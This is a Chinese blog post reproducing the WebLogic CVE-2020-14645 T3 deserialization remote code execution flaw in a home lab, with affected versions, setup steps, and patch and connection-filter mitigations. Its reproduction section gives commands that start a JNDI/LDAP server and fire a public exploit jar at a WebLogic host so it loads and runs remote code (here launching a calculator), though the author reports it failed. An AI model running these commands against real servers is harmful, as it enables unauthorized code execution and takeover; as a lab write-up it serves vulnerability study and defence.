# CVE-2020-14645 Weblogic 远程代码执行漏洞复现 - 只言 - 博客园

> 原文：[`www.cnblogs.com/liliyuanshangcao/p/13549992.html`](https://www.cnblogs.com/liliyuanshangcao/p/13549992.html)

# CVE-2020-14645 Weblogic 远程代码执行漏洞复现

## 漏洞介绍

今日，Oracle 官方发布 WebLogic 安全更新，其中修复了一个 CVSS 评分为 9.8 的严重漏洞(CVE-2020-14645)，该漏洞通过 T3 协议进行利用，攻击者可以实现远程代码执行，进而控制服务器。由于漏洞利用复杂度低，风险高，建议尽快修复。

WebLogic 是美国 Oracle 公司出品的一个 application server，是一个基于 JAVAEE 架构的中间件，WebLogic 是用于开发、集成、部署和管理大型分布式 Web 应用、网络应用和数据库应用的 Java 应用服务器。Oracle WebLogic Server 存在远程代码执行漏洞。

攻击者可利用该漏洞实现远程代码执行。该反序列化的 gadget 存在与 coherence 包中。编号 CVE-2020-14645。

构造 chain 类似于 common-collection 的 chain，可以照葫芦画瓢。

mvn 好像不能下载 coherence 包，很奇怪，直接下 jar 包就行。

反序列化的对象，通过 t3 发送给 weblogic 即可。所以，这个只是生成 payload 的工具。

## 影响范围

*   Oracle Oracle WebLogic Server 10.3.6.0.0
*   Oracle WebLogic Server 12.2.1.4.0
*   Oracle WebLogic Server 12.2.1.3.0
*   Oracle WebLogic Server 12.1.3.0.0
*   Oracle WebLogic Server 14.1.1.0.0

## 环境搭建

WebLogic 12.2.1.4 官方下载链接:

```
https://download.oracle.com/otn/nt/middleware/12c/122140/fmw_12.2.1.4.0_wls_lite_Disk1_1of1.zip 
```

下载 JDK 6u211/7u201/8u191 任意版本并配置环境变量

```
JDK8u191
下载地址：https://pan.baidu.com/s/1cCtSolwsZCmL7xN6orTjTw
提取码：nmi1 
```

用管理员权限打开 CMD 命令

```
java -jar fmw_12.2.1.4.0_wls_lite_generic.jar 
```

全部点击下一步，勾选自主启动配置向导选项

![](img/815f4cad7da095f4e6c458c0e45c14b0.png)

创建新域并勾选所有模板，点击下一步至安装完成

![](img/6a0619008ef15d64a761045aea094933.png)

安装成功后，跳到 base_domain 目录下

C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain

运行 startWebLogic.cmd

![](img/bf362fa84f92eca8b5ddb5653f728fd8.png)

可访问 7001 端口（[`192.168.1.111:7001/console/login/LoginForm.jsp），说明环境部署成功`](http://192.168.1.111:7001/console/login/LoginForm.jsp%EF%BC%89%EF%BC%8C%E8%AF%B4%E6%98%8E%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2%E6%88%90%E5%8A%9F)

![](img/d49d5534120f894fd9756b742946bcf7.png)

## 漏洞复现

JNDI 工具下载地址

[`github.com/welk1n/JNDI-Injection-Exploit`](https://github.com/welk1n/JNDI-Injection-Exploit)

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C [command] -A [address] 
```

使用 JNDI 工具搭建 LDAP 和 HTTP 服务，注意不能占用 8180/1099/1389 三个端口，修改要执行的命令后回车，会同时启动 LDAP/RMI/HTTP 三种服务，并且自动编译好带命令的 class 文件

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C calc -A 192.168.1.236 
```

![](img/d3f422623ac35d692b72c95c14bfb68c.png)

使用 CVE-2020-14645 漏洞验证工具

[`github.com/DSO-Lab/Weblogic_CVE-2020-14645`](https://github.com/DSO-Lab/Weblogic_CVE-2020-14645)

```
java -jar CVE-2020-14645.jar LDAP_IP:LDAP_PORT/#Exploit http://192.168.1.111:7001 
```

输入 JNDI 工具搭建 LDAP 地址和端口

```
java -jar CVE-2020-14645.jar 192.168.1.236:1389/mcq0vt http://192.168.1.111:7001 
```

![](img/5a9326640161d7a7e0fa3b52b594677e.png)

输入命令请求 LDAP 服务，执行自动编译的 class 文件，成功弹出计算器（失败，无法弹出计算器）

![](img/0d418fca82a28514f53573fc3aabe4d0.png)

PS：java 版本<jdk 6u211/7u201/8u191，我用的是 8u191，最后没有复现成功，通过本地测试发现报错如下：

![](img/12f967d6273d97d9a49d3e99b75d6835.png)

​ 原因是在更高版本的 JDK 环境中 trustURLCodebase 变量为 false，限制了远程类的加载。

## 修复建议

### 1、官方修复方案

Oracle 已经发布补丁修复了上述漏洞，请用户参考官方通告及时下载受影响产品更新补丁，并参照补丁安装包中的 readme 文件进行安装更新，以保证长期有效的防护。

注：Oracle 官方补丁需要用户持有正版软件的许可账号，使用该账号登陆[**https://support.oracle.com**](https://support.oracle.com/)后，可以下载最新补丁。

### 2、临时解决方案

用户可通过控制 T3 协议的访问来临时阻断针对这些漏洞的攻击。操作方法如下：

1.  进入 WebLogic 控制台，在 base_domain 的配置页面中，进入“安全”选项卡页面，点击“筛选器”，进入连接筛选器配置。
2.  在连接筛选器中输入：weblogic.security.net.ConnectionFilterImpl，参考以下写法，在连接筛选器规则中配置符合企业实际情况的规则：

```
127.0.0.1 * * allow t3 t3s
本机 IP * * allow t3 t3s
允许访问的 IP  * * allow t3 t3s  
* * * deny t3 t3s 
```

3.  保存后若规则未生效，建议重新启动 WebLogic 服务（重启 WebLogic 服务会导致业务中断，建议相关人员评估风险后，再进行操作）。

### 3、禁用 IIOP 协议。

可通过关闭 IIOP 协议对此漏洞进行缓解。操作如下：

1.  在 Weblogic 控制台中，选择“服务”->”AdminServer”->”协议”，取消“启用 IIOP”的勾选。

2.  并重启 Weblogic 项目，使配置生效。